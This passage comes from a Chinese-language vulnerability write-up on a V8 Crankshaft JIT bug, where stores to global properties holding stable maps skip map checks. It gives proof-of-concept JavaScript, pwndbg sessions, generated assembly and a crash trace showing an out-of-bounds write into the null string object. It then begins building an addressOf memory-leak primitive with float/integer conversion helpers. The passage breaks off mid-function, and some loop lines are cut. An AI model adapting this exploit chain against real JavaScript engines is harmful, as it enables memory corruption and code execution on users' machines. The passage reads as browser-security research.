由于加入了这个`DependentCode::kPrototypeCheckGroup`的检查，如果后期`map`变成`unstable`了，即使没有`checkmap`节点的检查，也因为有该检查而不会出错，保证其在结构发生变化时能进行`deoptimization
bailout`。
###  POC编写
我们的测试程序如下
    var a;
    function Ctor() {
       a = new Date();
    }
    for (var i=0;i [FAST_HOLEY_SMI_ELEMENTS]
     - value = 0xb6f27a263f1 
     - time = NaN
     - properties = {
     }
    0x17bdc13042a9: [Map]
     - type: JS_DATE_TYPE
     - instance size: 96
     - inobject properties: 0
     - elements kind: FAST_HOLEY_SMI_ELEMENTS
     - unused property fields: 0
     - enum length: invalid
     - stable_map
     - back pointer: 0x147f67e02311 
     - instance descriptors (own) #0: 0x147f67e02231 
     - layout descriptor: 0
     - prototype: 0x2bb939b8c2d9 
     - constructor: 0x2bb939b8c269 
     - code cache: 0x147f67e02241 
     - dependent code: 0x2bb939babd79 
     - construction counter: 0
其中可以观察到其`MAP`结构里有一个`stable_map`标记，我们接着`b
src/crankshaft/hydrogen.cc:6515`，在patch点上方下断点进行调试。
    In file: /home/sea/Desktop/v8/src/crankshaft/hydrogen.cc
       6519           break;
       6520         case PropertyCellConstantType::kStableMap: {
       6521           // The map may no longer be stable, deopt if it's ever different from
       6522           // what is currently there, which will allow for restablization.
       6523           Handle map(HeapObject::cast(cell->value())->map());
     ► 6524           Add(value);
       6525           value = Add(value, map);
       6526           access = access.WithRepresentation(Representation::HeapObject());
       6527           break;
       6528         }
       6529       }
    pwndbg> p map->is_stable()
    $17 = true
可以看见其`MAP`是`stable`的。  
在前面的基础上，加上对全局变量的属性进行赋值的操作，并进行优化
    var a;
    function Ctor() {
       a = new Date();
    }
    function opt() {
       a.x = 1;
    }
    for (var i=0;i
    0x27792c0650d    45  488b400f       REX.W movq rax,[rax+0xf]
    0x27792c06511    49  488b4007       REX.W movq rax,[rax+0x7]
    0x27792c06515    53  c7401301000000 movl [rax+0x13],0x1
    0x27792c0651c    60  48b8112358a8ae240000 REX.W movq rax,0x24aea8582311    ;; object: 0x24aea8582311 
    0x27792c06526    70  488be5         REX.W movq rsp,rbp
    0x27792c06529    73  5d             pop rbp
    0x27792c0652a    74  c20800         ret 0x8
    0x27792c0652d    77  0f1f00         nop
赋值操作显然没有过多的检查,这是因为该对象的`MAP`被标识为`stable map`，如果我们将`a = new Date()`改成`a =
{}`，其代码如下
    0xbbb2be06700     0  55             push rbp
    0xbbb2be06701     1  4889e5         REX.W movq rbp,rsp
    0xbbb2be06704     4  56             push rsi
    0xbbb2be06705     5  57             push rdi
    0xbbb2be06706     6  4883ec08       REX.W subq rsp,0x8
    0xbbb2be0670a    10  488b45f8       REX.W movq rax,[rbp-0x8]
    0xbbb2be0670e    14  488945e8       REX.W movq [rbp-0x18],rax
    0xbbb2be06712    18  488bf0         REX.W movq rsi,rax
    0xbbb2be06715    21  493ba5600c0000 REX.W cmpq rsp,[r13+0xc60]
    0xbbb2be0671c    28  7305           jnc 35  (0xbbb2be06723)
    0xbbb2be0671e    30  e8bdc1f5ff     call StackCheck  (0xbbb2bd628e0)    ;; code: BUILTIN
    0xbbb2be06723    35  48b841b7720d5a180000 REX.W movq rax,0x185a0d72b741    ;; object: 0x185a0d72b741 PropertyCell for 0x325b7f0af1b1 
    0xbbb2be0672d    45  488b400f       REX.W movq rax,[rax+0xf]
    0xbbb2be06731    49  a801           test al,0x1
    0xbbb2be06733    51  0f842c000000   jz 101  (0xbbb2be06765)
    0xbbb2be06739    57  49ba91c3f0ae60050000 REX.W movq r10,0x560aef0c391    ;; object: 0x560aef0c391 
    0xbbb2be06743    67  4c3950ff       REX.W cmpq [rax-0x1],r10
    0xbbb2be06747    71  0f851d000000   jnz 106  (0xbbb2be0676a)
    0xbbb2be0674d    77  c7401b01000000 movl [rax+0x1b],0x1
    0xbbb2be06754    84  48b8112348ddd5280000 REX.W movq rax,0x28d5dd482311    ;; object: 0x28d5dd482311 
    0xbbb2be0675e    94  488be5         REX.W movq rsp,rbp
    0xbbb2be06761    97  5d             pop rbp
    0xbbb2be06762    98  c20800         ret 0x8
    0xbbb2be06765   101  e8a0d8d7ff     call 0xbbb2bb8400a       ;; deoptimization bailout 1
    0xbbb2be0676a   106  e8a5d8d7ff     call 0xbbb2bb84014       ;; deoptimization bailout 2
    0xbbb2be0676f   111  90             nop
显然这里多了一个`Map(FAST_HOLEY_ELEMENTS)`的检查。既然加了patch和没加patch的生成的代码一样，为何后者能够有漏洞，这是因为虽然`checkmap`都移除了，但是`checkmap`仅能代表在这段JIT代码里可以做检查，调试发现，前者是无法执行到JIT的那个代码的，因为在执行JIT代码之前就已经做了检查（kPrototypeCheckGroup标记导致）。而后者能够执行到JIT代码。  
最终POC如下
    var a;
    function Ctor() {
       a = new Date();
    }
    function opt() {
       a.x = 0x123456;
    }
    for (var i=0;i [FAST_HOLEY_SMI_ELEMENTS]
     - value = 0xf89de5a6599 
     - time = NaN
     - properties = {
     }
    Received signal 11  000000000000
    ==== C stack trace ===============================
     [0x7f2ad9dc7a4e]
     [0x7f2ad9dc79a5]
     [0x7f2ad99cb8a0]
     [0x7f2ad8691b9c]
     [0x7f2ad869a1cd]
     [0x7f2ad869a8ae]
     [0x7f2ad86bb26c]
     [0x563cbf958f25]
     [0x563cbf958e45]
     [0x7f2ad86a244a]
     [0x7f2ad87cceef]
     [0x7f2ad87cb9d2]
     [0x7f2ad87cb52f]
     [0x2c31d0e043a7]
    [end of stack trace]
    Segmentation fault (core dumped)
虽然我们在`opt`函数里增加了一个属性，我们看到`properties`为空值，这意味着已发生了溢出。
可以看到，`0x123456`越界写到了后面，破坏了某处数据，导致程序崩溃，该处实际上就是`null
Value`对象。我们将最后的`opt`函数注释掉，然后重新调试。
    DebugPrint: 0x2609351265d9: [JSValue]
     - map = 0x15994da86981 [FastProperties]
     - prototype = 0x1a0972b178c1
     - elements = 0x2adf5c602241  [FAST_STRING_WRAPPER_ELEMENTS]
     - value = 0x2adf5c602251 
     - properties = {
       #length: 0x2adf5c656379  (accessor constant)
     }
###  addressOf原语构造
该对象的`value`指针指向了`0x2adf5c602251`，而该处正是属性值越界写的地方，因此，我们可以控制整个`null
Value`对象的数据，那么，我们只需要篡改`length`和`content`，就能完成地址泄露。  
文章开头介绍过有关属性存储的一些性质，那么，我们越界写，将`content`对应的位置属性赋值为对象地址，将`length`对应的位置的属性赋值为合适的整数，那么就可以再通过`String(null)`对象将content的内容读取出来，也就是实现了地址泄露，为了完成这个过程，我们还得保证不能损坏`null
Value`对象的前2个字段的数据，也就是`MAP`和`hash`。由于`hash`仅在低4字节有数据，那么我们可以将这个位置对应的属性赋值为0，因为0属于`SMI`类型，被保存到`hash`字段的高4字节处不影响其值；接下来是如何绕过`MAP`的值，我们可以考虑在对应字段赋值为一个`double`值，这样，该处数据不会被覆盖，`double`写入相当于是`mov
[val+0x7] = double_val`  
该处是一个`MAP`对象内部，这个位置的数据正好是一个不变的量，因此，我们只需要原模原样的赋值回去就可以了。
    pwndbg> x /2gx 0x0000335b22d82361+0x7
    0x335b22d82368:    0x0019000400007300    0x00000000082003ff
于是可以构造出`addressOf`原语
    var buf = new ArrayBuffer(0x8);
    var dv = new DataView(buf);
    function p64f(value1,value2) {
       dv.setUint32(0,value1,true);
       dv.setUint32(0x4,value2,true);
       return dv.getFloat64(0,true);
    }
    function u64f(value) {
       dv.setFloat64(0,value,true);
       return dv.getUint32(0,true) + dv.getUint32(4,true)*0x100000000;
    }
    var set;
    function opt_set() {
       set = new Set();
    }
    function fakeNullStrValue(obj) {
       set.x0 = p64f(0x00007300,0x00190004); //skip map
       set.x1 = 0; //hash